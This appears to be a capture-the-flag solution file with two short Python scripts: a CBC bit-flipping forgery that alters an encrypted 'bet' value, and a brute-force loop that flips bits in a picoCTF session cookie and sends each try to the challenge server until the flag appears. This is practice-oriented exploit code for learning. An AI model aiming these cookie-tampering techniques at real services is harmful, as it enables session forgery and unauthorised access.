# TSULOTT2 (MAWC)

script:

```python2
//python2
def xor1(x1, x2):
    return "".join(chr(ord(a) ^ ord(b)) for a, b in zip(x1, x2))


def main():
    code = "09c0841ae742af1a37c377e1a4f5bac41686002af3f065889d670a65f89858cfd79174d45a21c33a2df01568c807be21c3b6136497171817029faabea3cbf0dfb76bd618a737b874ee73dc9ce4d530cbdefebd96baba0b023cbe17fd85cc70dc".decode("hex")
    print(code.encode("hex"))
    x1 = "number=1;bet=100"
    x2 = "number=1;bet=10_"
    new_iv = xor1(x1, x2)
    new = xor1((code[:16]), new_iv)
    print((new + code[16:]).encode("hex"))

if __name__ == "__main__":
    main()
```

# More Cookie (picoCTF)

```python3
import requests
from base64 import b64encode, b64decode
from tqdm import tqdm

# bitflip
def xor(pos, bitf, data):
    data = bytearray(data)
    data[pos] = data[pos] ^ bitf
    return b64encode(b64encode(bytes(data)))

def main():
    url = "http://mercury.picoctf.net:43275/"
    cookie = "a0Z6NnMwSzNJS1luZTJwNXhydzBZb3ozZkNaaElTMG0zdnVOUUxNL0o0Tno2MFlQdkowVjg0YTlxOU4vaVhHZzRpWGlDd3R6Z1FPa3FoK1c1b2N5SEVnRGtHZzNnWStBT2pJb2NmTGpzT0NuaUVaYnNYcEN0Z0ZVZC96RUJuZ1U="

    cookie = b64decode(b64decode(cookie).decode())
    for pos in range(00, len(cookie)):
        for bitf in range(0, 96):
            c = xor(pos, bitf, cookie).decode()
            print(pos, bitf, c)
            res = requests.get(url, cookies={
                "auth_name":c
                }).text
            print(res) 
            if "pico" in res:
                print (res)
                return
            

if __name__ == "__main__":
    main()
 ```
